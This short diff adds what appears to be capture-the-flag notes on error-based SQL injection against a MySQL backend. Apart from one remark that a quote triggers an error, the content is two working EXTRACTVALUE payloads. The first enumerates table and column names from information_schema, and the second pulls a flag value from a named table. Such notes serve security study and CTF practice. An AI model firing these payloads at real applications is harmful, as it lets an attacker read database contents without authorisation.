@@ -1,0 +1,8 @@
+'
+
+This gives a mysql error !
+
+' OR (EXTRACTVALUE(1,CONCAT(':',(SELECT CONCAT(table_name,'::',column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 0,1),':')))#
+
+' OR (EXTRACTVALUE(1,CONCAT(':',(SELECT flag FROM elMuchoFlag),':')))#
+
